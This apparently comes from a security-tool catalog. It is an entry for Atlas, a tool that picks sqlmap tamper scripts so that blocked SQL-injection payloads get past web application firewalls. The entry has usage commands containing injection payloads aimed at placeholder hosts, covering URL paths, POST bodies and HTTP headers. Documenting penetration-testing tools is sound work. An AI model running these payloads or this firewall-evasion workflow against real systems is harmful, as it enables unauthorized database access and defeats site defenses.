---
name: "atlas"
categories:
  - blackarch-webapp
version: "7.77bd6c8"
homepage: "https://github.com/m4ll0k/Atlas"
packaged-by: [blackarch, aur, nixpkgs]
blackarch-builddate: "2026-01-12"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "m4ll0k/Atlas"
github-stars: 1410
github-pushed: "2022-07-18"
github-archived: false
github-issues: 19
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# atlas

> Suggests sqlmap tamper scripts that get a blocked SQL-injection payload past a WAF/IDS, by replaying the payload tampered in every known way and watching the returned status codes.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Bridging the gap between "sqlmap found the injection" and "the WAF eats every request". You hand Atlas the vulnerable URL, the injection point, and a payload you already know triggers the injection (typically one lifted from sqlmap's verbose output that got blocked), and it systematically applies sqlmap's tamper scripts — the tamper database ships with the tool — checking which transformation stops drawing a block response. It does not find injections and does not exploit them: the output is a `--tamper=` shortlist to feed back to sqlmap. Expect a Python 3 single-script tool, unmaintained upstream since 2022; the workflow it automates (tamper trial-and-error) is timeless.

## Typical use cases

### Get tamper suggestions for a blocked payload

```
python atlas.py --url 'http://target.example.com/index.php?id=Price_ASC' --payload "') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
```

Outcome: Atlas replays the payload through each tamper transformation against the live parameter and reports which tampers return a non-blocked status code. Re-run sqlmap with the winners, e.g. `sqlmap -u '...' --tamper=versionedkeywords,...`, to complete the extraction.

### Mark the injection point inside the URL path or a POST body

```
python atlas.py --url http://target.example.com/index/id/%%10%% --payload "-1234 AND 4321=4321-- AAAA" --random-agent -v
```

```
python atlas.py --url http://target.example.com/index/id/ -m POST -D 'test=%%10%%' --payload "-1234 AND 4321=4321-- AAAA" --random-agent -v
```

Outcome: `%%10%%` marks where the tampered payload gets substituted, so injections that live in a path segment (`-m GET` is the default) or in a POST parameter (`-D 'field=%%10%%'`) are tested at the right position instead of appended to a complete value.

### Test an injection that lives in an HTTP header

```
python atlas.py --url http://target.example.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload "-1234 AND 4321=4321-- AAAA" --random-agent -v
```

Outcome: `%%inject%%` inside the given header value marks the injection point; repeated `-H` flags carry the remaining static headers, so the tamper candidates are evaluated in the exact request context the target sees.

### Pre-select a tamper combination and verify it

```
python atlas.py --url http://target.example.com/index/id/%%10%% --payload "-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
```

Outcome: instead of enumerating all tampers, Atlas applies only the named comma-separated combination, confirming whether that specific chain of transformations gets through — handy to validate a tamper stack before committing a slow sqlmap run with it.

### List the tamper database

```
python atlas.py -g
```

Outcome: prints every tamper script Atlas knows about, which is the quickest way to see the candidate pool (and to pick `--concat` arguments) without reading sqlmap's tamper directory.
